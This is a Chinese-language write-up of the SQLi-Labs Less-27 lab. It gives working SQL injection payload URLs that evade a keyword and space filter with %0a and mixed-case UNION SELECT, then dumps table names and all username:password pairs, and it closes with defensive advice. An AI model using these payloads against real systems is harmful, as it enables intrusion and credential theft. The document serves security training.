## 一、题目信息
- 平台：SQLi-Labs
- 分类：Web - SQL Injection
- 难度：地狱级
- 通关标识：在 `UNION` 和 `SELECT` 关键字被彻底封杀的极端环境下，利用 `%0a`（换行符）替代空格、大小写混淆以及 `||` 逻辑或拼接，完成完美的联合查询闭环，爆出所有账号密码。

## 二、大白话原理讲解
这关的柜员（数据库）是个“极度强迫症”，他把咱们最爱用的作案工具全没收了：
1. **封杀关键字**：只要看到 `UNION` 和 `SELECT`（不管大小写），直接拦截。
2. **封杀空格**：空格被吃掉，导致普通 `SELECT *` 语法瘫痪。
3. **封杀注释符**：`#` 和 `--+` 都没了，没法剪掉后面的 `LIMIT 0,1` 小尾巴。

**怎么破？用“魔术道具”！**
*   **绕过空格**：用 `%0a`（换行符的 URL 编码）来代替空格。
*   **绕过关键字**：把大小写打乱，写成 `UnIoN` 和 `SeLeCt`，骗过那些只过滤纯小写单词的防御机制。
*   **绕过注释符**：在结尾用 `||'`，利用后台自带的 `') LIMIT 0,1` 进行完美语法对接。

## 三、解题步骤与 Payload 解析

**第一步：探测回显点**
输入 URL：
```text
?id=0' UnIoN%0aSeLeCt%0a1, 2, 3 ||'
```
**回显现象**：页面正常显示 `Your Login name:2` 和 `Your Password:1`。确认存在回显。

**构造解析：**
*   `id=0'`：输入 0 让原查询查空，单引号闭合前面的语法。
*   `UnIoN%0aSeLeCt`：用 `%0a` 充当空格，打乱大小写。**注意：这里一定要在 `0'` 后面留一个真正的空格，否则 `0'UnIoN` 会粘在一起报错。**
*   `1, 2, 3`：占位测试列数，发现第 1 列和第 2 列会回显在页面上。
*   `||'`：与后台自带的 `') LIMIT 0,1` 进行拼接，形成 `||'') LIMIT 0,1`，语法完美闭环，不需要注释符。

**第二步：联合查询爆库名**
输入 URL：
```text
?id=0' UnIoN%0aSeLeCt%0a1, database(), 3 ||'
```
**回显现象**：`Your Login name:security`。

**第三步：爆表名**
输入 URL：
```text
?id=0' UnIoN%0aSeLeCt%0a1, group_concat(table_name), 3%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database() ||'
```
**回显现象**：`Your Login name:emails, referers, uagents, users`。

**第四步：脱库拿密码**
输入 URL：
```text
?id=0' UnIoN%0aSeLeCt%0a1, group_concat(username, 0x3a, password), 3%0afrom%0ausers%0awhere%0a1=1 ||'
```
**回显现象**：成功爆出所有账号密码（包含之前修改的 `admin:p@ssw0rd`）。

## 四、踩坑记录与复盘
1. **空格与换行符的较量**：在某些特殊环境下，直接用 `%0a` 可能也会被过滤。如果 `%0a` 不行，可以尝试用 `%09`（制表符）或者用括号 `()` 替代空格。
2. **回显点的确认**：一定要先做第一步验证。因为联合查询的列数必须对应，如果列数不对，后面怎么查都没用。

## 五、总结与防御
**本题总结**：
Less-27 展示了 WAF 绕过的高级艺术。只要 SQL 语法允许，没有空格、没有注释符、没有 select 关键字，依然能依靠换行符和大小写混淆构造出完整的数据查询。

**安全防御建议**：
- **预编译语句（PDO/MySQLi）**：彻底阻断注入，让任何花里胡哨的绕过都无效。
- **规范化处理**：对输入进行统一转小写并过滤空白字符（包括换行、制表符），不要只盯着普通空格。
